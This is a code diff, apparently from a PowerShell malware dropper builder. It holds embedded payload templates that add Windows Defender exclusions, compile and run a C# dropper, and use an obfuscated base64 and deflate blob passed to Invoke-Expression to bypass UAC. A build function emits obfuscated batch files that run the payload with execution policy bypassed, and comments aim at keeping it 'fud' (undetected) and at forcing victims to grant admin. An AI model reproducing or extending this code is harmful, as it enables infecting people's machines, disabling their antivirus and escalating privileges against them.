@@ -42,14 +42,12 @@ $EMBEDDED_CODE_ADMIN = @'
 $mypath = $MyInvocation.MyCommand.Path
 $MAIN_PATH = Split-Path $mypath
 $MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
-
 try {
     Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $MAIN_PATH -ErrorAction SilentlyContinue
 } catch {
     Write-Host "nah"
 }
-
 $CSHARP = @"
 using System.IO;
 using System.Linq;
@@ -75,10 +73,8 @@ public class Dropped
     }
 }
 "@
-
 $CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
-
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process "powershell.exe" -ArgumentList " -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 Add-Type -TypeDefinition $CSHARP -Language CSharp
 [Dropped]::Main()
 '@
@@ -87,14 +83,12 @@ $EMBEDDED_CODE_ADMIN_UAC_BYPASS = @'
 $mypath = $MyInvocation.MyCommand.Path
 $MAIN_PATH = Split-Path $mypath
 $MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
-
 try {
     Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $MAIN_PATH -ErrorAction SilentlyContinue
 } catch {
     Write-Host "nah"
 }
-
 $CSHARP = @"
 using System.IO;
 using System.Linq;
@@ -120,11 +114,8 @@ public class Dropped
     }
 }
 "@
-
 $CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
-
 $base64_my_path = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Path))
-
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { $code = "$base64_my_path" ; (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION }
 else {
     Add-Type -TypeDefinition $CSHARP -Language CSharp
@@ -341,12 +332,13 @@ function build {
             if ($line -eq "") {
                 continue
             }
-            $line = "echo " + $line
-            $line = $line + " >> payload.ps1"
+            $line_split = $line.Replace("`n", "")
+            $line_split = $line_split.Replace("`r", "")
+            $line = "echo " + $line_split + " >> payload.ps1"
             $line = Invoke-obfuscate $line
             Add-Content -Path .\output\payload.bat -Value $line
         }
-        $str_obf = "powershell -ExecutionPolicy Bypass -File payload.ps1 && del payload.ps1"
+        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\payload.ps1"
         $str_obf = Invoke-obfuscate $str_obf
         $var_OUTPUT_BOX.Text += "Writing obfuscated batch code to file...`n"
         Add-Content -Path .\output\payload.bat -Value $str_obf
@@ -434,7 +426,7 @@ $var_OUTPUT_BOX.add_TextChanged({
 
 $var_OUTPUT_BOX.Text += "Successfully Started`n"
 Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
-Hide-Console #Makes it look nice
+#Hide-Console #Makes it look nice
 #If you don't want UAC admin to be required when running the payload set this to $false
 $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
 $uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
